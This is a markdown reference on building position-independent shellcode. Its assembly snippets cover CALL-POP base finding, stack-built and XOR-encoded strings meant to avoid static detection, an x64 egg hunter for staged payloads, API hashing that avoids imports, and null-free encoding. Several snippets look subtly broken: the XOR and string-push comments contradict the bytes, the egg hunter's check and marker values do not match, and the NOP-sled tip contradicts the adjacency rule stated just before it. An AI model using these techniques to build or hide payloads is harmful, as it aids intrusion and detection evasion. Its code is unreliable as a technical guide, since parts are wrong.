# Position-Independent Code (PIC) Patterns

## Why PIC Matters for Shellcode

Shellcode is injected into an arbitrary virtual address — cannot rely on fixed addresses.
All data and code references must be computed at runtime relative to the current RIP or a saved base.

---

## 1. CALL-POP Base Address (x86 / x64)

Works on both x86 and x64. Most portable pattern.

```nasm
BITS 64
_start:
    call  .get_base         ; PUSH .get_base+5 (return addr = next instruction)
.get_base:
    pop   rbx               ; RBX = runtime address of label .get_base

; Reference any label:
    lea   rax, [rbx + (my_str - .get_base)]
    ; ...
my_str db "cmd", 0
```

**Constraint**: CALL and POP must be adjacent — no morpher/encoder may insert code between them.
Mark this pair with a `ALIGN 16` NOP sled before the CALL to help detection avoidance.

---

## 2. RIP-Relative Addressing (x64 preferred)

Cleaner, no thunk needed. Works only on x64.

```nasm
; NASM syntax
lea  rax, [rel my_data]         ; RIP + (my_data - next_insn)

; GAS / AT&T syntax
lea  my_data(%rip), %rax
```

For function pointers stored in data:
```nasm
lea  rbx, [rel dispatch_table]
mov  rax, [rbx + 8*IDX]         ; load func ptr from table
call rax
```

---

## 3. Stack-Based Strings (avoid .data section)

### Classic push approach (x86-32)
```nasm
xor  eax, eax
push eax              ; null terminator
push 0x6e697762       ; "bwin" (little-endian "winb" reversed)
push 0x6f632f63       ; "c/co"
push 0x65782f27       ; (rest of path)
mov  edi, esp         ; ptr to string
```

### x64 approach (8-byte chunks)
```nasm
xor  rax, rax
push rax                           ; null terminator
mov  rax, 0x6800726f74736e6f       ; "onstro\0h" ... build in reverse
push rax
; ...
mov  rcx, rsp                      ; arg1 = ptr to string
```

### Inline xor-byte trick (avoid null bytes in string pushes)
```nasm
; encode "cmd\0" as XOR'd bytes to avoid static match
db 0x62 ^ 0x01  ; 'c' ^ 1 = 0x62
db 0x6c ^ 0x01  ; 'm' ^ 1
db 0x6c ^ 0x01  ; 'd' ^ 1
db 0x01         ; 0x00 ^ 1 = 0x01 (decoder XORs back)
```

---

## 4. AlignRSP (guaranteed 16-byte alignment at shellcode entry)

Windows x64 ABI requires RSP to be 16-byte aligned before a CALL.
Shellcode entry may receive misaligned RSP — this wrapper fixes it:

```nasm
AlignRSP:
    push  rsi
    mov   rsi, rsp
    and   rsp, -16              ; align down to 16-byte boundary
    sub   rsp, 0x20             ; Win64 shadow space (homing slots)
    call  shellcode_main
    mov   rsp, rsi
    pop   rsi
    ret
```

Or inline at the top of shellcode_main:
```nasm
shellcode_main:
    push  rbp
    mov   rbp, rsp
    and   rsp, -16
    sub   rsp, 0x20
    ; ... body ...
    mov   rsp, rbp
    pop   rbp
    ret
```

---

## 5. Egg Hunter (small PIC stub for staged payloads)

An egg hunter searches virtual memory for a 4–8 byte magic marker (the "egg") followed by the real payload.
Used when the injection buffer is small but a larger payload sits elsewhere in memory.

### x64 egg hunter (NtAccessCheckAndAuditAlarm trick for safe page probing)
```nasm
; egg = 0x5050504050505050 (repeated 2x before the real payload)
egg_hunter:
    xor  rbx, rbx
    xor  rcx, rcx
    or   rbx, -1              ; RBX = 0xFFFFFFFFFFFFFFFF
.next_addr:
    inc  rbx
    add  rbx, 7
    and  rbx, -8              ; align to 8 bytes

    ; probe page access via NtAccessCheckAndAuditAlarm (syscall 2)
    ; alternatively use IsBadReadPtr / SEH-based probe
    mov  rax, 0x0000000200000000
    xchg rbx, rax             ; check if in user space
    cmp  rax, rbx
    jg   .next_addr

    mov  eax, 0x50505040      ; egg marker half
    cmp  [rbx], eax
    jne  .next_addr
    cmp  [rbx+4], eax
    jne  .next_addr
    ; found egg — payload at rbx+8
    jmp  rbx
```

---

## 6. API Hashing (no import table required)

All API names resolved by computing a hash from the ASCII string in the export table:

### DJB2 hash (common in PIC shellcode)
```nasm
; input: RSI = ptr to null-terminated ASCII function name
; output: EAX = DJB2 hash
djb2_hash:
    mov  eax, 5381          ; seed
.loop:
    movzx ecx, byte [rsi]
    test  cl, cl
    jz    .done
    ; EAX = (EAX << 5) + EAX + CL
    mov   edx, eax
    shl   eax, 5
    add   eax, edx
    add   eax, ecx
    inc   rsi
    jmp   .loop
.done:
    ret
```

### Case-insensitive variant (AND 0xDF to uppercase)
```nasm
    and   cl, 0xDF          ; convert lowercase to uppercase before hashing
    add   eax, ecx
```

---

## 7. NULL-Free Shellcode Techniques

Many injection vectors are string-based (strcpy, WriteFile) and stop at null bytes.

| Problem | Solution |
|---|---|
| `MOV EAX, 0` contains 0x00 bytes | `XOR EAX, EAX` |
| `PUSH 0` | `XOR EBX, EBX; PUSH EBX` |
| Short JMP with 0x00 offset | Use NOP to shift; or longer form |
| `MOV RAX, 0x...0000...` (zero MSBs) | Use `MOV EAX, imm32` (zero-extends) |

Validate with: `objdump -d stub.o | grep -E ' 00 '`.
